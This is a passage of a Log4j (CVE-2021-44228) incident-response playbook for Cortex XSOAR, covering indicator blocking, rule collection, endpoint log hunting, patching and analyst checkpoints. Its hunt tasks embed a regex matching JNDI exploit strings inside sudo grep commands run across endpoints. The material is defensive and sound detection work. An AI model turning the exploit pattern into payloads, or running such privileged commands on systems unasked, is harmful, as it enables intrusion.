    nexttasks:
      '#none#':
      - "87"
      - "74"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 831fd878-3596-4f95-8740-5496e0f090ec
      iscommand: false
      name: Hunt Using Cortex XDR
      type: title
      version: -1
    taskid: 831fd878-3596-4f95-8740-5496e0f090ec
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1220,
          "y": 1410
        }
      }
  "38":
    continueonerrortype: ""
    id: "38"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 0
      scriptArguments:
        AutoCommit:
          simple: "No"
        CustomBlockRule:
          simple: "True"
        CustomURLCategory:
          simple: Demisto Remediation - Malicious URLs
        IP:
          complex:
            accessor: IP
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        MD5:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "32"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        SHA256:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "64"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        URL:
          complex:
            accessor: URL
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        URLListName:
          simple: Demisto Remediation - URL EDL
      wait: 1
    nexttasks:
      '#none#':
      - "42"
    note: false
    quietmode: 0
    scriptarguments:
      AutoCommit:
        simple: "No"
      CustomBlockRule:
        simple: "True"
      CustomURLCategory:
        simple: Demisto Remediation - Malicious URLs
      IP:
        complex:
          accessor: IP
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      MD5:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
              operator: stringHasLength
              right:
                value:
                  simple: "32"
          root: ExtractedIndicators.File
          transformers:
          - operator: uniq
      SHA256:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
              operator: stringHasLength
              right:
                value:
                  simple: "64"
          root: ExtractedIndicators.File
          transformers:
          - operator: uniq
      URL:
        complex:
          accessor: URL
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      URLListName:
        simple: Demisto Remediation - URL EDL
      Username:
        complex:
          accessor: Indicator
          filters:
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: DBotScore.Type
              operator: isEqualString
              right:
                value:
                  simple: username
          - - left:
                iscontext: true
                value:
                  simple: DBotScore.Score
              operator: greaterThanOrEqual
              right:
                value:
                  simple: "3"
          root: DBotScore
    separatecontext: true
    skipunavailable: false
    task:
      brand: ""
      description: |+
        This playbook blocks malicious Indicators using all integrations that are enabled, using the following sub-playbooks:

        - Block URL - Generic
        - Block Account - Generic
        - Block IP - Generic v2
        - Block File - Generic v2
        - Block Email - Generic
        - Block Domain - Generic

      id: 7f25249b-8b6c-46ca-8dc5-d532ac145635
      iscommand: false
      name: Block Indicators - Generic v2
      playbookId: Block Indicators - Generic v2
      type: playbook
      version: -1
    taskid: 7f25249b-8b6c-46ca-8dc5-d532ac145635
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 2970
        }
      }
  "39":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.BlockIndicatorsAutomatically
          operator: isEqualString
          right:
            value:
              simple: "True"
      label: "yes"
    continueonerrortype: ""
    id: "39"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "40"
      "yes":
      - "41"
      - "38"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether IOCs associated with the incident can be blocked
        automatically.
      id: 1f2061ec-0421-4298-8038-bbc5a87fd89d
      iscommand: false
      name: Block indicators automatically?
      type: condition
      version: -1
    taskid: 1f2061ec-0421-4298-8038-bbc5a87fd89d
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 2750
        }
      }
  "40":
    continueonerrortype: ""
    id: "40"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "42"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Manually block the IOCs in the relevant systems.
      id: 28be4519-1eba-499a-854c-eadeec20cbf1
      iscommand: false
      name: Block indicators manually
      type: regular
      version: -1
    taskid: 28be4519-1eba-499a-854c-eadeec20cbf1
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1610,
          "y": 2970
        }
      }
  "41":
    continueonerrortype: ""
    id: "41"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        AutoCommit:
          simple: "No"
        Domain:
          complex:
            accessor: Domain
            root: ExtractedIndicators
        DomainListName:
          complex:
            root: inputs.EDLDomainBlocklist
        pre-post-rulebase:
          simple: pre-rulebase
      wait: 1
    nexttasks:
      '#none#':
      - "42"
    note: false
    quietmode: 0
    scriptarguments:
      AutoCommit:
        simple: "No"
      Domain:
        complex:
          accessor: Domain
          root: ExtractedIndicators
      DomainListName:
        complex:
          root: inputs.EDLDomainBlocklist
      pre-post-rulebase:
        simple: pre-rulebase
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: |-
        This playbook blocks Domains using Palo Alto Networks Panorama or Firewall External Dynamic Lists.
        It checks if the EDL configuration is in place with the 'PAN-OS EDL Setup' sub-playbook
        (otherwise the list will be configured), and adds the input Domains to the relevant lists.
      id: 783ec971-de2f-4277-8541-e3a06d954ed1
      iscommand: false
      name: PAN-OS - Block Domain - External Dynamic List
      playbookId: PAN-OS - Block Domain - External Dynamic List
      type: playbook
      version: -1
    taskid: 783ec971-de2f-4277-8541-e3a06d954ed1
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 710,
          "y": 2970
        }
      }
  "42":
    continueonerrortype: ""
    id: "42"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "50"
      - "52"
      - "53"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 112fe1bc-8b1f-4a40-8fbd-51a9968f038d
      iscommand: false
      name: Mitigation
      type: title
      version: -1
    taskid: 112fe1bc-8b1f-4a40-8fbd-51a9968f038d
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 3260
        }
      }
  "43":
    continueonerrortype: ""
    id: "43"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        For CVE-2021-45046 and CVE-2021-44228, please patch with one of the following versions:
        **log4j-2.15.0-rc2**
        **log4j-2.16.0**

        For CVE-2021-45105, please patch with the following version:
        **Log4j 2.17.0 (Java 8)**

        The files are available via the following link:
        [Download Apache Log4j 2](https://logging.apache.org/log4j/2.x/download.html)
      id: d7ca488e-6859-4d7b-8728-3e98e5eb5143
      iscommand: false
      name: Install log4j patched versions
      type: regular
      version: -1
    taskid: d7ca488e-6859-4d7b-8728-3e98e5eb5143
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1410,
          "y": 3560
        }
      }
  "44":
    continueonerrortype: ""
    id: "44"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: "To disable JNDI lookup on vulnerable servers - \n* Remove the
        JndiLookup file in the log4j-core and restart the service\n  * Setup log4j2.formatMsgNoLookups=true\n\nTo
        disable JNDI on vulnerable servers -\n* Set up spring.jndi.ignore=true"
      id: e2f94a60-d35b-40fb-8387-a469d5c05b87
      iscommand: false
      name: Disable JNDI and JNDI lookup
      type: regular
      version: -1
    taskid: e2f94a60-d35b-40fb-8387-a469d5c05b87
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1880,
          "y": 3560
        }
      }
  "45":
    continueonerrortype: ""
    id: "45"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    message:
      bcc: null
      body:
        simple: Do you need to continue with the investigation?
      cc: null
      format: ""
      methods: []
      replyOptions:
      - "Yes"
      - "No"
      subject: null
      timings:
        completeafterreplies: 1
        completeaftersla: false
        completeafterv2: false
        retriescount: 2
        retriesinterval: 360
      to: null
    nexttasks:
      "No":
      - "48"
      "Yes":
      - "47"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Check with the analyst whether to continue with the investigation.
      id: 809e8c2a-778a-402a-8fec-0927ea9edc74
      iscommand: false
      name: Analysis resolution - Should continue with the investigation?
      type: condition
      version: -1
    taskid: 809e8c2a-778a-402a-8fec-0927ea9edc74
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 3910
        }
      }
  "46":
    continueonerrortype: ""
    id: "46"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 75d8cdf8-c586-4e1f-8b21-72693d30ac49
      iscommand: false
      name: Done
      type: title
      version: -1
    taskid: 75d8cdf8-c586-4e1f-8b21-72693d30ac49
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 4370
        }
      }
  "47":
    continueonerrortype: ""
    id: "47"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "46"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Manual step for further incident investigation. CISA released an
        open-source detection and scanning tool for discovering and fuzzing for Log4J
        RCE CVE-2021-44228 vulnerability. For more information , [CISA GitHub](https://github.com/cisagov/log4j-scanner/tree/master/log4-scanner)
      id: 2b4462a2-0379-4364-8c3b-3de7f5311bb1
      iscommand: false
      name: Investigate Further
      type: regular
      version: -1
    taskid: 2b4462a2-0379-4364-8c3b-3de7f5311bb1
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 680,
          "y": 4160
        }
      }
  "48":
    continueonerrortype: ""
    id: "48"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "46"
    note: false
    quietmode: 0
    scriptarguments:
      closeReason:
        simple: No further actions are required.
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: Close the current incident
      id: b185976b-516f-4b4e-8e85-27927b1ba66c
      iscommand: true
      name: Close Investigation
      script: Builtin|||closeInvestigation
      type: regular
      version: -1
    taskid: b185976b-516f-4b4e-8e85-27927b1ba66c
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 4160
        }
      }
  "49":
    continueonerrortype: ""
    id: "49"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "45"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 2cf4835a-4b15-4c71-8e62-9604eed4fa28
      iscommand: false
      name: Resolution
      type: title
      version: -1
    taskid: 2cf4835a-4b15-4c71-8e62-9604eed4fa28
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 3750
        }
      }
  "50":
    continueonerrortype: ""
    id: "50"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "51"
      - "44"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 12da048e-788f-4ceb-8aac-8f358d1ca772
      iscommand: false
      name: Unit42 Recommended Mitigations
      type: title
      version: -1
    taskid: 12da048e-788f-4ceb-8aac-8f358d1ca772
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 2110,
          "y": 3410
        }
      }
  "51":
    continueonerrortype: ""
    id: "51"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Disable suspicious outbound traffic, such as LDAP and RMI on the
        server in PANW Firewall.
      id: 890f7e71-fb0c-4f96-847e-7b82ce75a125
      iscommand: false
      name: PANW - Disable suspicious outbound traffic
      type: regular
      version: -1
    taskid: 890f7e71-fb0c-4f96-847e-7b82ce75a125
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2340,
          "y": 3560
        }
      }
  "52":
    continueonerrortype: ""
    id: "52"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "43"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: da69b65d-073c-4fbd-8643-d81b8ee08812
      iscommand: false
      name: Patch Vulnerability
      type: title
      version: -1
    taskid: da69b65d-073c-4fbd-8643-d81b8ee08812
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1410,
          "y": 3410
        }
      }
  "53":
    continueonerrortype: ""
    id: "53"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "54"
      - "55"
      - "64"
      - "65"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: c5908feb-24ef-4a63-89ea-97bcc655dad3
      iscommand: false
      name: Deploy Detection Rules
      type: title
      version: -1
    taskid: c5908feb-24ef-4a63-89ea-97bcc655dad3
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 210,
          "y": 3410
        }
      }
  "54":
    continueonerrortype: ""
    id: "54"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Snort rules file has been downloaded as emerging-exploit-snort.rules and is available for download directly from XSOAR.
        Please note the log4j rules are part of the latest released package.
      id: 0f88c578-867e-40f4-8fd1-6bf28040839e
      iscommand: false
      name: Snort Rules
      type: regular
      version: -1
    taskid: 0f88c578-867e-40f4-8fd1-6bf28040839e
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 430,
          "y": 3560
        }
      }
  "55":
    continueonerrortype: ""
    id: "55"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Suricata rules file has been downloaded as emerging-exploit-suricata.rules and is available for download directly from XSOAR.
        Please note the log4j rules are part of the latest released package.
      id: a229a0ab-3115-4d55-88c1-3c508fb03cd2
      iscommand: false
      name: Suricata Rules
      type: regular
      version: -1
    taskid: a229a0ab-3115-4d55-88c1-3c508fb03cd2
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 870,
          "y": 3560
        }
      }
  "57":
    continueonerror: true
    continueonerrortype: ""
    id: "57"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "15"
    note: false
    quietmode: 0
    scriptarguments:
      retry-count:
        simple: "3"
      retry-interval:
        simple: "2"
      tags:
        simple: CVE-2021-44228
      type:
        simple: IP
      value:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.IP
              operator: isNotEmpty
          root: ExtractedIndicators.IP
          transformers:
          - operator: uniq
      verdict:
        complex:
          root: inputs.CollectedIndicatorsSeverity
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.new.indicator
      id: aeee6620-027f-480c-8be8-2ec6f499f136
      iscommand: true
      name: Tag IP indicators
      script: Builtin|||createNewIndicator
      type: regular
      version: -1
    taskid: aeee6620-027f-480c-8be8-2ec6f499f136
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1010,
          "y": -270
        }
      }
  "58":
    continueonerror: true
    continueonerrortype: ""
    id: "58"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "15"
    note: false
    quietmode: 0
    scriptarguments:
      retry-count:
        simple: "3"
      retry-interval:
        simple: "2"
      tags:
        simple: Log4j
      type:
        simple: CVE
      value:
        complex:
          root: inputs.RelatedCVEs
          transformers:
          - args:
              delimiter:
                value:
                  simple: ', '
            operator: split
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.new.indicator
      id: a272aadd-304e-435c-8943-8fd313cf366a
      iscommand: true
      name: Tag CVE indicators
      script: Builtin|||createNewIndicator
      type: regular
      version: -1
    taskid: a272aadd-304e-435c-8943-8fd313cf366a
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1450,
          "y": -270
        }
      }
  "60":
    continueonerrortype: ""
    id: "60"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 0
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      interval:
        simple: "1"
      query_expression:
        complex:
          root: QRadarQuery
      timeout:
        simple: "600"
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: This playbook runs a QRadar query and return its results to the
        context.
      id: abc57b2b-cc60-40e9-8d53-f74a2fb730c1
      iscommand: false
      name: QRadarFullSearch
      playbookId: QRadarFullSearch
      type: playbook
      version: -1
    taskid: abc57b2b-cc60-40e9-8d53-f74a2fb730c1
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": -550,
          "y": 1100
        }
      }
  "62":
    continueonerrortype: ""
    id: "62"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: YaraRules.yar
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://raw.githubusercontent.com/Neo23x0/signature-base/master/yara/expl_log4j_cve_2021_44228.yar
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: Download Yara Rules
      id: ee980e35-c9d5-4d90-8a36-045adb49058b
      iscommand: false
      name: Download Yara Rules
      script: http
      type: regular
      version: -1
    taskid: ee980e35-c9d5-4d90-8a36-045adb49058b
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 310,
          "y": -980
        }
      }
  "63":
    continueonerrortype: ""
    id: "63"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: SigmaRules.yml
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/web/web_cve_2021_44228_log4j_fields.yml
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: Download Sigma Rules
      id: 8499a94c-4313-4822-80b8-30a170a98985
      iscommand: false
      name: Download Sigma Rules
      script: http
      type: regular
      version: -1
    taskid: 8499a94c-4313-4822-80b8-30a170a98985
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 770,
          "y": -980
        }
      }
  "64":
    continueonerrortype: ""
    id: "64"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Sigma rules file has been downloaded as SigmaRules.yml and is available
        for download directly from XSOAR.
      id: 3977ec08-07a9-43d9-87b7-258354466bd1
      iscommand: false
      name: Sigma Rules
      type: regular
      version: -1
    taskid: 3977ec08-07a9-43d9-87b7-258354466bd1
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -10,
          "y": 3560
        }
      }
  "65":
    continueonerrortype: ""
    id: "65"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Yara rules file has been downloaded asYaraRules.yar and is available
        for download directly from XSOAR.
      id: 432e01c3-2cc0-47a0-86c3-234b54eeb079
      iscommand: false
      name: Yara Rules
      type: regular
      version: -1
    taskid: 432e01c3-2cc0-47a0-86c3-234b54eeb079
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -450,
          "y": 3560
        }
      }
  "66":
    continueonerrortype: ""
    id: "66"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "7"
      - "6"
      - "63"
      - "62"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 8b2460a2-093a-440b-8849-1964cdb95e85
      iscommand: false
      name: Collect Detection Rules
      type: title
      version: -1
    taskid: 8b2460a2-093a-440b-8849-1964cdb95e85
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 770,
          "y": -1130
        }
      }
  "69":
    continueonerrortype: ""
    id: "69"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      "no":
      - "29"
      "yes":
      - "32"
    note: false
    quietmode: 0
    scriptarguments:
      brandname:
        simple: Cortex XDR - IR
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Returns 'yes' if integration brand is available. Otherwise returns
        'no'
      id: 73e26da7-a417-4083-8879-d27eebe03aa4
      iscommand: false
      name: Check if Cortex XDR - IR is Enabled
      script: IsIntegrationAvailable
      type: condition
      version: -1
    taskid: 73e26da7-a417-4083-8879-d27eebe03aa4
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1520,
          "y": 1730
        }
      }
  "70":
    continueonerror: true
    continueonerrortype: ""
    id: "70"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "71"
      - "73"
    note: false
    quietmode: 0
    scriptarguments:
      platform:
        simple: linux
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Gets a list of endpoints, according to the passed filters. If there
        are no filters, all endpoints are returned. Filtering by multiple fields will
        be concatenated using AND condition (OR is not supported). Maximum result
        set size is 100. Offset is the zero-based number of endpoint from the start
        of the result set (start by counting from 0).
      id: b0a3e2e0-54e7-4d61-8fa2-1cb775d32ff3
      iscommand: true
      name: Retrieve All Endpoint IDs
      script: '|||xdr-get-endpoints'
      type: regular
      version: -1
    taskid: b0a3e2e0-54e7-4d61-8fa2-1cb775d32ff3
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2000,
          "y": 2245
        }
      }
  "71":
    continueonerrortype: ""
    id: "71"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        commands:
          simple: pwd
        endpoint_ids:
          complex:
            accessor: endpoint_id
            filters:
            - - ignorecase: true
                left:
                  iscontext: true
                  value:
                    simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                operator: isEqualString
                right:
                  value:
                    simple: CONNECTED
            root: PaloAltoNetworksXDR.Endpoint
        polling_timeout:
          simple: "10"
      wait: 1
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 0
    scriptarguments:
      commands:
        simple: sudo egrep -i -r '\$\{jndi:(ldap[s]?|rmi|dns|corba|iiop|nis|nds):/[^\n]+'
      endpoint_ids:
        complex:
          accessor: endpoint_id
          filters:
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
              operator: isEqualString
              right:
                value:
                  simple: CONNECTED
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.os_type
              operator: isEqualString
              right:
                value:
                  simple: AGENT_OS_LINUX
          root: PaloAltoNetworksXDR.Endpoint
      polling_timeout:
        simple: "5"
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Initiates a new script execution of shell commands.
      id: 5444307a-5966-477e-8e83-9c5c3cd6a23c
      iscommand: false
      name: Hunt /var/log for exploitation patterns - Uncompressed
      playbookId: Cortex XDR - Execute commands
      type: playbook
      version: -1
    taskid: 5444307a-5966-477e-8e83-9c5c3cd6a23c
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 2000,
          "y": 2440
        }
      }
  "72":
    continueonerrortype: ""
    id: "72"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "71"
      - "73"
    note: false
    quietmode: 0
    scriptarguments:
      endpoint_id_list:
        complex:
          root: inputs.XDREndpointIDs
      platform:
        simple: linux
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Gets a list of endpoints, according to the passed filters. If there
        are no filters, all endpoints are returned. Filtering by multiple fields will
        be concatenated using AND condition (OR is not supported). Maximum result
        set size is 100. Offset is the zero-based number of endpoint from the start
        of the result set (start by counting from 0).
      id: ca6e5b68-8b51-4b5d-85ce-8fe286f53648
      iscommand: true
      name: Retrieve specified endpoint IDs
      script: '|||xdr-get-endpoints'
      type: regular
      version: -1
    taskid: ca6e5b68-8b51-4b5d-85ce-8fe286f53648
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2450,
          "y": 2245
        }
      }
  "73":
    continueonerrortype: ""
    id: "73"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        commands:
          simple: pwd
        endpoint_ids:
          complex:
            accessor: endpoint_id
            filters:
            - - ignorecase: true
                left:
                  iscontext: true
                  value:
                    simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                operator: isEqualString
                right:
                  value:
                    simple: CONNECTED
            root: PaloAltoNetworksXDR.Endpoint
        polling_timeout:
          simple: "10"
      wait: 1
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 0
    scriptarguments:
      commands:
        simple: sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$\{jndi:(ldap[s]?|rmi|dns|corba|iiop|nis|nds):/[^\n]+'
      endpoint_ids:
        complex:
          accessor: endpoint_id
          filters:
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
              operator: isEqualString
              right:
                value:
                  simple: CONNECTED
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.os_type
              operator: isEqualString
              right:
                value:
                  simple: AGENT_OS_LINUX
          root: PaloAltoNetworksXDR.Endpoint
      polling_timeout:
        simple: "5"
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Initiates a new script execution of shell commands.
      id: fc34e8ee-df24-4256-8f35-875c19f78713
      iscommand: false
      name: Hunt /var/log for exploitation patterns - Compressed
      playbookId: Cortex XDR - Execute commands
      type: playbook
      version: -1
    taskid: fc34e8ee-df24-4256-8f35-875c19f78713
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 2450,
          "y": 2440
        }
      }
  "74":
    continueonerrortype: ""
    id: "74"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "75"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 0a9708c4-ecf8-43d4-87e3-f89ea7f6ebf4
      iscommand: false
      name: 'Cortex XDR - XQL Hunting Queries '
      type: title
      version: -1
    taskid: 0a9708c4-ecf8-43d4-87e3-f89ea7f6ebf4
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 900,
          "y": 1570
        }
      }
  "75":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.RunXQLHuntingQueries
          operator: isEqualString
          right:
            value:
              simple: "True"
      label: "yes"
    continueonerrortype: ""
    id: "75"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "29"
      "yes":
      - "80"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether to execute XDR shell script for exploitation hunting.
      id: e3204d42-30d8-41fe-8f53-d139aeefd9d7
      iscommand: false
      name: Should run XQL hunting queries?
      type: condition
      version: -1
    taskid: e3204d42-30d8-41fe-8f53-d139aeefd9d7
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 900,
          "y": 1730
        }
      }
  "77":
    continueonerrortype: ""
    id: "77"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=30d |
          dataset = xdr_data

          | filter actor_process_image_name contains "java"

          | filter (agent_os_sub_type contains "server" or agent_os_type = ENUM.AGENT_OS_LINUX )

          | filter action_file_name contains "log4j" and action_file_extension = "jar" // testing

          |fields agent_hostname, agent_ip_addresses, actor_effective_username, action_file_name, action_file_path

          | dedup agent_hostname

          | join conflict_strategy = left type=left

          (

          dataset = xdr_data

          |filter event_type = NETWORK AND event_sub_type = NETWORK_STREAM_ACCEPT

          |alter rfc1918_172 = incidr(action_remote_ip, "172.16.0.0/12")

          |alter rfc1918_10 = incidr(action_remote_ip, "10.0.0.0/8")

